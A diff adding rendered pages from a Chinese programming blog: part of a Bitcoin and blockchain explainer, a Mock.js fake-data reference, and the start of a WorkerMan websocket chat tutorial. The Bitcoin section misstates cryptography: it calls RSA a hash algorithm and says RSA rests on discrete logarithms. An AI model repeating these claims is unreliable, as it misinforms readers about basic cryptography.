+<td>转账方发送指令到中心服务器，中心服务器修改账本实现财富转移，接收方不需要任何操作，转账不受地理位置限</td>
+<td>转账方发送指令到比特币网络，由比特币网络实现对账本进行修改 </td>
+</tr>
+<tr>
+<td>限制</td>
+<td>现金的使用不受限</td>
+<td>中心化账本的使用，经常受限制</td>
+<td>比特币的使用不受限</td>
+</tr>
+</tbody>
+</table>
+<p>比特币是自由财富，它可以点对点的转移，不受中心节点管控，这很像现金；但比特币的转移不受地域限制，这很像中心化记账的存款。比特币结合了两者的优势，这是比特币价值所在。</p>
+<h2 id="比特币实现"><a href="#比特币实现" class="headerlink" title="比特币实现"></a>比特币实现</h2><p>通过上述分析，比特币是通过去中心化的存储网络来记录账本，并且在这个基础上，实现点对点的财富转移功能。比特币要实现以上功能有几个难点：</p>
+<ul>
+<li>账本公开保存在网络上，如何保证正确性</li>
+<li>当有新的转账产生时，谁来实施记账<h4 id="区块链数据结构"><a href="#区块链数据结构" class="headerlink" title="区块链数据结构"></a>区块链数据结构</h4></li>
+</ul>
+<p>比特币首次使用了区块链这种数据结构，这种数据结构通过哈希算法，锁定数据的方式，保证数据不被篡改。</p>
+<p>区块链可以拆分成两个词语：区块、链。如果把区块链比做一本笔记本，那么区块就是笔记本的一页纸，这些纸上面记录了很多转账信息。为了保证区块所记录的转账信息不被篡改，每个区块都锁定上一块区块的内容。一旦某个区块被篡改，会出现连环雪崩效应，要修改后面所有的区块来掩盖非法修改。如果希望修改的区块能被其他节点认可，需要做繁重的运算来让其他节点确认，这基本不可能。</p>
+<p>比特币系统认为，一旦区块被六个区块锁定，这个数据就不可能被篡改了。</p>
+<h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><p>哈希算法是一类算法，它的作用是获得数据的指纹（一个整数），常见的哈希算法有 RSA、RIPEMD160、SHA3 等等。对数据 x 进行哈希运算，得到结果 y，可以记作 $$ H(x) = y$$ 。</p>
+<p>x 可以代表一个数，或者是任意大小(比如 2G 的文件)，无论是什么样的 x，通过哈希运算之后得到相应的整数 y。</p>
+<p>如果有 $$ H(x_1) = y_1 $$ 和 $$ H(x_2) = y_2 $$ ，那么可以认为：</p>
+<ul>
+<li>对于不同的  $$x_1$$和 $$x_2$$ ， $$y_1$$ 和 $$y_2$$ 是不同的。</li>
+<li>如果 $$y_1$$和$$y_2$$相同，那么可以认为 $$x_1$$ 和 $$x_2$$ 是相同的。</li>
+</ul>
+<p>哈希算法经常用来验证文件完整性，当我们从互联网下载一个很大的文件（比如系统安装盘），那么下载网站通常会提供一个 RSA 运算的哈希值，用于校验文件的完整性。当文件下载完毕之后，使用对应的哈希算法，计算该文件的哈希值，如果和下载网站提供的哈希值相同，那么意味着下载的文件是完整的。</p>
+<p>哈希值在区块链中，其中一个作用是，在区块中保存上一个区块的哈希值，用于锁定上一块区块数据的完整性。</p>
+<h3 id="确权"><a href="#确权" class="headerlink" title="确权"></a>确权</h3><p>比特币是比特币网络（或者叫做比特币系统）的记账单位，记账除了记录财富数量之外，还要记录财富属于谁这个属性，在比特币系统中，使用非对称加密技术来对比特币进行确权。</p>
+<p>比特币系统没有中心节点，因此比特币系统开户，不需要到某个组织去登记，只需要自己随机生成一串密钥作为自己的账户，这个密钥我们称之为私钥。然后使用私钥，根据椭圆曲线非对称加密算法规则，生成私钥对应的公钥，再使用公钥，生成比特币钱包地址。用户可以将自己的钱包地址公布于众，用于接收比特币财产，在区块链中，使用钱包地址来进行确权。</p>
+<p>使用钱包地址确权的比特币，只有对应的私钥，才能够将其解开，并进行再次转移。因此私钥是非常重要的信息，不可暴露给其他人或者丢失。如果私钥暴露或者丢失，意味着财富的不安全，并且无法找回密码。</p>
+<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>加密算法很早就有，通过一些算法，将信息隐藏起来，早期加密依靠加密算法，也就是算法泄漏了，加密也就被破解了。现代加密保障不在于算法，在于密钥，算法是公开的，只要保存好密钥，就保证了加密安全。</p>
+<p>有些算法，加密密钥和解密密钥是一致的，这种加密算法叫做对称加密，典型的对称加密算法有 AES (高级加密标准)。对称加密算法速度很快，不过密钥交换存在隐患。</p>
+<p>1977年，三位数学家设计了 RSA 加密算法，这个加密算法的加密和解密使用不同的密钥。两个密钥分别称为私钥和公钥。使用公钥加密的密文，私钥可以解密；使用私钥加密的密文，公钥可以解密。如果你想进行加密通信，只要把公钥公布于世，私钥则之有自己持有，这样任何人都可以使用公钥进行加密之后，再进行传输，其他人使用公钥无法对数据进行解密，只有持有私钥的人才可以解密。</p>
+<p>非对称加密基于这样的数学原理：$$f(x) = y$$ 的计算很简单，但是 $$ f(y) = x $$ 很难。只要符合这种情况的数学式，都可以作为非对称加密的基础。RSA 基于离散对数，后来数学家们发明了更难于破解的 ECC（椭圆曲线非对称加密算法），比特币中使用的就是 ECC 算法。</p>
+<p>非对称加密算法虽然很厉害，但是一次能加密的数据有限，如果一个很大的文件需要使用非对称加密算法来进行加密，那么性能是很差的。在秘密通信过程中，非对称加密通常只用于交换对称加密的密钥。</p>
+<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>非对称加密还可以用于数字签名，当 A 发表一篇文章，然后使用哈希算法计算文章的哈希值，再用 A 的私钥对哈希值进行加密，加密的结果就是这篇文章的数字签名。其他人可以用 A 的公钥，来解密数字签名，如果解密的结果，正是这篇文章的哈希值，那么这篇文章一定是 A 写的，并且文章内容没有被篡改过。</p>
+<p>数字签名可以保证数据不可抵赖，比如 A 发送转账信息给 B，然后 A 可以抵赖，说我没有发过，这个数据不知道谁发的。但是如果 A 发送的数据中，包含数字签名的话，那么 A 就不可以抵赖了。</p>
+<p>签名过程：$$y = Sign(A, x) = Encrypt( Hash(x),  A_{priKey} )$$</p>
+<p>验证过程：如果 $$Decrypt(y, A_{pubKey}) == Hash(x)$$ 成立，那么可以称为，x 是 A 发布的信息，中间没人篡改。</p>
+<h3 id="转移、验证、记账"><a href="#转移、验证、记账" class="headerlink" title="转移、验证、记账"></a>转移、验证、记账</h3><p>财富需要流动才有意义，如果 A 想将比特币财富转移给 B，这个过程，需要 A 的私钥和 B 的钱包地址才可以进行。A 通过脚本 S1 将自己的财富解锁，然后给需要转移部分财富，附上一段脚本 S2，S2 脚本只有 B 的私钥才能够执行。</p>
+<p>如果 A 不是个诚实的人，那么他可以利用网络延迟，将自己的一份财富，同时转给 B 和 C，这种攻击被称为 <strong>双花</strong> 攻击。在中心化世界里，双花攻击的防护由中心节点完成。在比特币系统里，没有中心节点存在，为了避免这种攻击，比特币系统会选举一个临时的验证节点，来验证财富转移请求的合法性。选取临时节点的游戏规则是，哪个节点计算出哈希值符合规则，那么那个节点就拥有了此次记账的权利，所有比特币节点都尊重这个游戏规则，不尊重游戏规则的节点，将会被踢出比特币网络。</p>
+<h3 id="分叉"><a href="#分叉" class="headerlink" title="分叉"></a>分叉</h3><p>为了避免双花攻击，需要临时选取临时节点进行转账验证，这些竞争记账权的节点称之为矿工，竞争的过程称之为挖矿，竞争成功的矿工，可以为系统增加区块，并且在这个区块中，给自己奖励比特币。</p>
+<p>如果两个矿工同时宣布挖矿成功，那么会出现两个后缀区块的情况，这种情况称之为分叉。比特币并不倾向两个分叉中的任何一个，而是搁置争议，继续运行，经过一段时间的竞争之后，总有一个链的长度会比另外一个链长，而比特币系统，只认可比较长的链。</p>
+<p>渐进式共识的思维，在比特币中非常重要，对区块链未来的发展，也是很有指导意义的。</p>
+<h3 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h3><p>上文中提到，比特币的转账，是通过脚本来执行的，如果丰富这些脚本功能，加上一些判断条件，那么转账就成为有条件的转移，这种条件是双方的某种约定，或者叫做合同。这种可编程的交易，用于规范和约定双方的行为，比当前世界中，纸质的合同更加有执行效率。比特币的脚本功能偏弱，因此才会有号称区块链 2.0 的以太坊的崛起。</p>
+<h2 id="比特币的伟大和欠缺"><a href="#比特币的伟大和欠缺" class="headerlink" title="比特币的伟大和欠缺"></a>比特币的伟大和欠缺</h2><p>比特币是伟大的发明，创造了自由的货币体系，把传递消息的互联网升级为传递价值的区块链网络，并且这个网络在没有任何管理员管理的情况下，安静的运行了 10 年，没有大的事故发生。但是作为第一代区块链应用，比特币还是有考虑不周的情况：</p>
+<ul>
+<li>比特币的开发和维护者，无法在系统运行过程中持续收益，导致了比特币软件升级乏力。</li>
+<li>比特币为了体现去中心化，创始人都匿了，导致没有人管理和规划比特币系统未来。</li>
+<li>比特币追求通过繁重的工作量证明来争夺记账权，避免了黑客攻击，但是耗费很多电力资源。</li>
+<li>比特币繁重的工作是计算哈希值，而很多人通过近似作弊的手段，提高算力获益。</li>
+<li>比特币为了提高安全性，动态调整哈希计算难度，将出块速度限制为 10 分钟左右，并且限制区块数据大小为 1 M，导致性能低下。</li>
+</ul>
+<h2 id="模仿者和创新者"><a href="#模仿者和创新者" class="headerlink" title="模仿者和创新者"></a>模仿者和创新者</h2><p>由于比特币源代码是开源的，任何人可以轻松获得源代码，在比特币基础上，稍作修改，换个名字，发行一种新的虚拟货币，这种币称之为“山寨币”。最成功的“山寨币”是莱特币，目前在虚拟货币世界里，市值排名第七，它修改了出块时间和区块尺寸，交易速度加快，在 2013 年推出并获得认可和成功。</p>
+<p>现在新的山寨币已经不太可能获得市场认可，因此一些山寨币，并没有创世块，而是从比特币的某一区块进行分叉，在分叉处实行新的游戏规则，并且承认之前比特币账户的资产，通过空投方式给这些比特币账户发送对应的新币，这些新币称之为“分叉币”，分叉币也是山寨币，不同的是它已经有相应的比特币用户了，相对容易获得市场任何。分叉币成功的典型是比特现金，目前市值排名第四。</p>
+<p>还有一些程序员，参考比特币实现，重新调整游戏规则，并增加业务功能，这种虚拟货币不能称之为“山寨币”，而是一种新的公链，成功的典型是以太坊，目前以太坊市值仅次于比特币，被业界称之为“区块链 2.0”。</p>
+<h2 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h2><p>以太坊很多和比特币一样，包括非对称加密算法的选择，工作量证明共识算法，它的伟大在于，完善了比特币的脚本功能，实现了图灵完备的智能合约功能。图灵完备的智能合约使得以太坊除了具有去中心化货币功能之外，还有合约功能。如果说比特币是全球账本，那么以太坊就是全球计算机。如果把比特币当成一本本子，那么以前记账全靠口算，而以太坊则是一本本子加上一个计算器。除了业务先进之外，以太坊的创始人作为一面旗帜，指导者以太坊前进的方向。在经济系统方面，以太坊引入 gas 概念，使得以太币有了使用价值，也比比特币更进一步。</p>
+<h2 id="区块链应用和发展"><a href="#区块链应用和发展" class="headerlink" title="区块链应用和发展"></a>区块链应用和发展</h2><h3 id="记账和传递价值"><a href="#记账和传递价值" class="headerlink" title="记账和传递价值"></a>记账和传递价值</h3><p>记账和传递价值，是区块链最基本的应用，比特币是典型，基于区块链的货币，是一种更好的货币。</p>
+<h3 id="智能合约-1"><a href="#智能合约-1" class="headerlink" title="智能合约"></a>智能合约</h3><p>使用智能合约来约束人们的行为，并且在智能合约中，对不遵守合约的人，实施惩罚，这样可以降低信任成本，提高合作效率。</p>
+<h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>区块链网络中的节点，都是物理电脑，这些电脑可以携带大规模存储，为区块链系统存储信息。信息保存到区块链上有诸多好处：</p>
+<ul>
+<li>永远在线</li>
+<li>价格便宜</li>
+<li>数据安全</li>
+<li>无法被监管</li>
+</ul>
+<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>网络属于另一个方面的基础建设，目前区块链网络是平等的对等网络，通信完全靠喊（广播），规划好网络，也就是建立局部网络通信，建立子网，用于提高区块链性能，是很重要的一个方向。</p>
+<h3 id="互联网"><a href="#互联网" class="headerlink" title="互联网"></a>互联网</h3><p>当区块链系统中的存储和网络规划完成时，互联网的许多应用会被迁移到区块链系统，阿里云等各种提供云存储和计算的公司成为历史，类似淘宝也会直接上区块链，并且物品是使用虚拟货币结算的。</p>
+<h3 id="物联网"><a href="#物联网" class="headerlink" title="物联网"></a>物联网</h3><p>如果区块链不和物相关，那么区块链应用永远在信息、虚拟领域发挥作用。当物联网和区块链关联起来，让更多的确权、交易，落地到物品上时，区块链将无处不在。</p>
+<h3 id="经济系统"><a href="#经济系统" class="headerlink" title="经济系统"></a>经济系统</h3><p>不发币的区块链是没有生命力的，在区块链上有了币之后，就要考虑游戏规则，如果游戏规则不公平，那么对应的链很快没有用户。</p>
+<p>区块链系统设计步骤：</p>
+<ol>
+<li>链必须有经济效益</li>
+<li>链产生的经济效益应该体现在链上的电子货币上</li>
+<li>确定参与系统的角色</li>
+<li>为每个角色的活动，定义奖励和惩罚措施</li>
+<li>分析、测试、验证</li>
+<li>回到第 4 步调整</li>
+</ol>
+<p>经济系统设计其实类似游戏中的数值策划，把经济系统设计成为合理的系统，对于公链来说至关重要。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.572Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/前端/">前端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    8 分钟 读完 (大约 1159 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/前端开发中使用mockjs模拟数据/">前端开发中使用mockjs模拟数据</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>mock拦截Ajax请求，生成随机数据</p>
+</blockquote>
+<h2 id="模拟数据"><a href="#模拟数据" class="headerlink" title="模拟数据"></a>模拟数据</h2><ol>
+<li>直接生成模拟数据</li>
+</ol>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mock.mock(模板|<span class="hljs-function"><span class="hljs-keyword">function</span>)</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>为接口地址模拟数据</li>
+</ol>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mock.mock(url,模板|<span class="hljs-function"><span class="hljs-keyword">function</span>)</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>为接口以及请求方式模拟数据</li>
+</ol>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mock.mock(url,type,模板|<span class="hljs-function"><span class="hljs-keyword">function</span>)</span></span><br></pre></td></tr></table></figure>
+<p>说明：url也可以是一个字符串也可以是一个正则。</p>
+<h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><p>模拟数据时要根据模板来模拟，模板是一个对象类型的值，格式为：</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">'名称|规则'</span>:<span class="hljs-string">'值'</span></span><br></pre></td></tr></table></figure>
+<p>名称：模拟的数据的名字。<br>值：模拟的数据的值。<br>规则：模拟出数据的规则，常用的几个规则：   </p>
+<ol>
+<li>min-max：生成的范围</li>
+<li>count：生成的数量</li>
+<li>+step：递增step</li>
+</ol>
+<h2 id="生成随机数据"><a href="#生成随机数据" class="headerlink" title="生成随机数据"></a>生成随机数据</h2><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Method</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>基本类型</td>
+<td>boolean, natural, integer, float, character, string, range, date, time, datetime, now</td>
+</tr>
+<tr>
+<td>图片</td>
+<td>image, dataImage</td>
+</tr>
+<tr>
+<td>颜色</td>
+<td>color</td>
+</tr>
+<tr>
+<td>文本</td>
+<td>paragraph, sentence, word, title, cparagraph, csentence, cword, ctitle</td>
+</tr>
+<tr>
+<td>姓名</td>
+<td>first, last, name, cfirst, clast, cname</td>
+</tr>
+<tr>
+<td>网站</td>
+<td>url, domain, email, ip, tld</td>
+</tr>
+<tr>
+<td>地址</td>
+<td>area, region</td>
+</tr>
+<tr>
+<td>编号</td>
+<td>guid, id</td>
+</tr>
+</tbody>
+</table>
+<p>使用时我们只需要把值设置成 <strong>@方法名</strong> 即可</p>
+<p>1.生成boolean</p>
+<pre><code>@boolean
+</code></pre><p>2.生成数字</p>
+<pre><code>2.1 自然数(&gt;=0整数)
+
+@natural
+@natural(min,max)
+
+2.2 整数
+
+@integer
+@integer(min,max)
+
+2.3小数
+
+@float
+@float(min,max,dmin,dmax)
+    dmin：小数部分位数最小值
+    dmax：小数部分位数最大值
+
+2.4 整数整组
+
+@range(min,max)  
+@range(min,max,step)    
+step：递增的步长
+
+@range(10)
+// =&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
+@range(3, 7)
+// =&gt; [3, 4, 5, 6]
+@range(1, 10, 2)
+// =&gt; [1, 3, 5, 7, 9]
+@range(1, 10, 3)
+// =&gt; [1, 4, 7]
+</code></pre><p>3.生成文本</p>
+<pre><code>3.1单个字符
+
+@character  
+@character(&apos;lower/upper/number/symbol&apos;)  
+@character(pool) 
+
+​    如果传入了 `&apos;lower&apos;` 或 `&apos;upper&apos;`、`&apos;number&apos;`、`&apos;symbol&apos;`，表示从内置的字符池中选取一个字符：
+
+{
+    lower: &quot;abcdefghijklmnopqrstuvwxyz&quot;,
+    upper: &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;,
+    number: &quot;0123456789&quot;,
+    symbol: &quot;!@#$%^&amp;*()[]&quot;
+}
+
+3.2字符串
+
+@string  
+@string(length)  
+@string(min,max)  
+
+3.3英文单词
+
+@word  
+@word(length)  
+@word(min,max)  
+
+3.4英文句子
+
+@sentence  
+@sentence(len)  
+@sentence(min,max)  
+
+3.5英文段落
+
+@paragraph  
+@paragraph(len)  
+@paragraph(min,max)  
+
+3.5中文汉字
+
+@cword  
+@cword(pool)  
+@cword(len)  
+@cword(pool,len)  
+@cword(min,max)  
+@cword(pool,min,max)  
+
+@cword()
+// =&gt; &quot;干&quot;
+@cword(&apos;零一二三四五六七八九十&apos;)
+// =&gt; &quot;六&quot;
+@cword(3)
+// =&gt; &quot;别金提&quot;
+@cword(&apos;零一二三四五六七八九十&apos;, 3)
+// =&gt; &quot;&quot;七七七&quot;&quot;
+@cword(5, 7)
+// =&gt; &quot;设过证全争听&quot;
+@cword(&apos;零一二三四五六七八九十&apos;, 5, 7)
+// =&gt; &quot;九七七零四&quot;
+
+3.6中文句子
+
+@csentence  
+@csentence(len)  
+@csentence(min,max)  
+
+3.7中文段落
+
+@cparagraph   
+@cparagraph(len)  
+@cparagraph(min,max)  
+
+3.8中文标题
+
+@ctitle  
+@ctitle(len)  
+@ctitle(min,max)  
+</code></pre><p>4.生成名字</p>
+<pre><code>4.1英文名
+
+@first  
+    名  
+@last  
+姓  
+@name  
+    姓名  
+@name(middle)  
+    middle：是否生成中间名字  
+
+@name()  
+// =&gt; &quot;Larry Wilson&quot;  
+@name(true)  
+// =&gt; &quot;Helen Carol Martinez&quot;  
+
+4.2中文名
+
+@cfirst  
+    姓  
+@clast  
+    名  
+@cname  
+    姓名  
+
+@cname()
+// =&gt; &quot;袁军&quot;
+</code></pre><p>5.网站</p>
+<pre><code>5.1生成一个IP
+
+@ip
+
+5.2生成一个Email
+
+@email  
+@email(domain)  
+    domain：指定域名  
+
+@email()
+// =&gt; &quot;x.davis@jackson.edu&quot;
+@email(&apos;nuysoft.com&apos;)
+// =&gt; &quot;h.pqpneix@nuysoft.com&quot;
+
+5.3生成域名
+
+@domain
+
+5.4生成URL
+
+@url  
+@url(protocol,host)  
+    protocol：指定协议，例如HTTP  
+    host：指定域名  
+
+@url()
+// =&gt; &quot;mid://axmg.bg/bhyq&quot;
+@url(&apos;http&apos;)
+// =&gt; &quot;http://splap.yu/qxzkyoubp&quot;
+@url(&apos;http&apos;, &apos;nuysoft.com&apos;)
+</code></pre><p>6.生成时间</p>
+<pre><code>6.1基本用法
+
+@date  
+@time  
+@datetime  
+
+6.2格式化时间
+
+可以通过 format 参数设置时间的格式  
+
+@date(format)  
+@time(format)  
+@datetime(format)  
+
+| Format | Description                                              | Example      |
+| ------ | -------------------------------------------------------- | ------------ |
+| yyyy   | A full numeric representation of a year, 4 digits        | 1999 or 2003 |
+| yy     | A two digit representation of a year                     | 99 or 03     |
+| y      | A two digit representation of a year                     | 99 or 03     |
+| MM     | Numeric representation of a month, with leading zeros    | 01 to 12     |
+| M      | Numeric representation of a month, without leading zeros | 1 to 12      |
+| dd     | Day of the month, 2 digits with leading zeros            | 01 to 31     |
+| d      | Day of the month without leading zeros                   | 1 to 31      |
+| HH     | 24-hour format of an hour with leading zeros             | 00 to 23     |
+| H      | 24-hour format of an hour without leading zeros          | 0 to 23      |
+| hh     | 12-hour format of an hour without leading zeros          | 1 to 12      |
+| h      | 12-hour format of an hour with leading zeros             | 01 to 12     |
+| mm     | Minutes, with leading zeros                              | 00 to 59     |
+| m      | Minutes, without leading zeros                           | 0 to 59      |
+| ss     | Seconds, with leading zeros                              | 00 to 59     |
+| s      | Seconds, without leading zeros                           | 0 to 59      |
+| SS     | Milliseconds, with leading zeros                         | 000 to 999   |
+| S      | Milliseconds, without leading zeros                      | 0 to 999     |
+| A      | Uppercase Ante meridiem and Post meridiem                | AM or PM     |
+| a      | Lowercase Ante meridiem and Post meridiem                | am or pm     |
+| T      | Milliseconds, since 1970-1-1 00:00:00 UTC                | 759883437303 |
+</code></pre><ol start="7">
+<li>生成地址<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">7.1</span>生成中国大区</span><br><span class="line"></span><br><span class="line">@region</span><br><span class="line"></span><br><span class="line">@region()  </span><br><span class="line"><span class="hljs-comment">// =&gt; "华北"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">7.2</span>生成省份</span><br><span class="line"></span><br><span class="line">@province  </span><br><span class="line"></span><br><span class="line"><span class="hljs-number">7.3</span>生成城市</span><br><span class="line"></span><br><span class="line">@city  </span><br><span class="line">@city(prefix)  </span><br><span class="line">	prefix：布尔值，是否生成所属的省  </span><br><span class="line"></span><br><span class="line">@city()</span><br><span class="line"><span class="hljs-comment">// =&gt; "唐山市"</span></span><br><span class="line">@city(<span class="hljs-literal">true</span>)</span><br><span class="line"><span class="hljs-comment">// =&gt; "福建省 漳州市"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">7.4</span>生成县</span><br><span class="line"></span><br><span class="line">@county  </span><br><span class="line">@county(prefix)  </span><br><span class="line">	prefix：布尔值，是否生成所属省、  </span><br><span class="line"></span><br><span class="line">@county()</span><br><span class="line"><span class="hljs-comment">// =&gt; "上杭县"</span></span><br><span class="line">@county(<span class="hljs-literal">true</span>)</span><br><span class="line"><span class="hljs-comment">// =&gt; "甘肃省 白银市 会宁县"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">7.5</span>生成邮政编码 </span><br><span class="line"></span><br><span class="line">@zip</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>8.编号</p>
+<pre><code>8.1身份证
+
+@id
+
+@id()  
+ // =&gt; &quot;420000200710091854&quot;
+
+8.2GUID
+
+@guid 
+
+@guid()
+// =&gt; &quot;662C63B4-FD43-66F4-3328-C54E3FF0D56E&quot;
+</code></pre><p>9.生成图片</p>
+<pre><code>9.1图片URL
+
+@image()  
+@image( size )  
+@image( size, background )  
+@image( size, background, text )  
+@image( size, background, foreground, text )  
+@image( size, background, foreground, format, text )  
+    size：尺寸，格式为：&apos;宽x高&apos;  
+    background：背景色，格式为：#FFFFFF  
+    text：图片上显示的文本  
+    foreground：广本颜色  
+    format：图片格式，可选值包括：png、gif、jpg。  
+
+@image  
+// =&gt; &quot;http://dummyimage.com/125x125&quot;  
+@image(&apos;200x100&apos;)  
+// =&gt; &quot;http://dummyimage.com/200x100&quot;    
+@image(&apos;200x100&apos;, &apos;#fb0a2a&apos;)  
+// =&gt; &quot;http://dummyimage.com/200x100/fb0a2a&quot;    
+@image(&apos;200x100&apos;, &apos;#02adea&apos;, &apos;Hello&apos;)  
+// =&gt; &quot;http://dummyimage.com/200x100/02adea&amp;text=Hello&quot;  
+@image(&apos;200x100&apos;, &apos;#00405d&apos;, &apos;#FFF&apos;, &apos;Mock.js&apos;)  
+// =&gt; &quot;http://dummyimage.com/200x100/00405d/FFF&amp;text=Mock.js&quot;  
+@image(&apos;200x100&apos;, &apos;#ffcc33&apos;, &apos;#FFF&apos;, &apos;png&apos;, &apos;!&apos;)  
+// =&gt; &quot;http://dummyimage.com/200x100/ffcc33/FFF.png&amp;text=!&quot;  
+
+
+
+9.2Base64图片编码
+
+@dataImage  
+@dataImage(size)  
+@dataImage(size,text)  
+</code></pre><p>10.生成颜色</p>
+<pre><code>@color  
+@hex  
+@rgb  
+@rgba  
+@hsl  
+</code></pre>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.568Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/后端/">后端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 952 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/WorkerMan入门1/">windows下WorkerMan实现简单的多人在线聊天</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>博主做项目遇到了在网页中需要实现在线聊天的功能，我一看，一脸懵逼，完全没有思路，最后得益于万能的百度，终于知道了websocket这种神奇的协议，还知道了WorkerMan这个神奇的PHP socket服务器框架，下面我们来简单聊聊WorkerMan的简单使用，楼主水平有限，如果有错误，欢迎大家在下面的评论区指出~~</p>
+</blockquote>
+<h2 id="1，介绍：Workerman是什么？"><a href="#1，介绍：Workerman是什么？" class="headerlink" title="1，介绍：Workerman是什么？"></a>1，介绍：Workerman是什么？</h2><p>Workerman是一款纯PHP开发的开源高性能的PHP socket 服务框架。</p>
+<p>Workerman不是重复造轮子，它不是一个MVC框架，而是一个更底层更通用的socket服务框架，你可以用它开发tcp代理、梯子代理、做游戏服务器、邮件服务器、ftp服务器、甚至开发一个php版本的redis、php版本的数据库、php版本的nginx、php版本的php-fpm等等。Workerman可以说是PHP领域的一次创新，让开发者彻底摆脱了PHP只能做WEB的束缚。</p>
+<p>实际上Workerman类似一个PHP版本的nginx，核心也是多进程+Epoll+非阻塞IO。Workerman每个进程能维持上万并发连接。由于本身常住内存，不依赖Apache、nginx、php-fpm这些容器，拥有超高的性能。同时支持TCP、UDP、UNIXSOCKET，支持长连接，支持Websocket、HTTP、WSS、HTTPS等通讯协以及各种自定义协议。拥有定时器、异步socket客户端、异步Mysql、异步Redis、异步Http、异步消息队列等众多高性能组件。<strong>以上内容来自WorkerMan手册介绍，地址<a href="http://doc3.workerman.net/640361" target="_blank" rel="noopener">http://doc3.workerman.net/640361</a></strong></p>
+<h2 id="2，环境配置，"><a href="#2，环境配置，" class="headerlink" title="2，环境配置，"></a>2，环境配置，</h2><p>Workerman是基于php的，所以我们需要先配置好php环境（配置好的可以忽略），需要配置好环境变量，这个请自行百度解决，使用php -v 查看php 版本，如下图，环境就是配置成功的了，就可以继续下一步的操作！<img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/QQ%E6%88%AA%E5%9B%BE20180611203612.png" alt="image"></p>
+<h2 id="3，下载Workerman"><a href="#3，下载Workerman" class="headerlink" title="3，下载Workerman"></a>3，下载Workerman</h2><p>到Workerman<a href="http://www.workerman.net/" target="_blank" rel="noopener">官网</a>下载Workerman,如下图：<br><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/workerman%E4%B8%8B%E8%BD%BD.png" alt="image"></p>
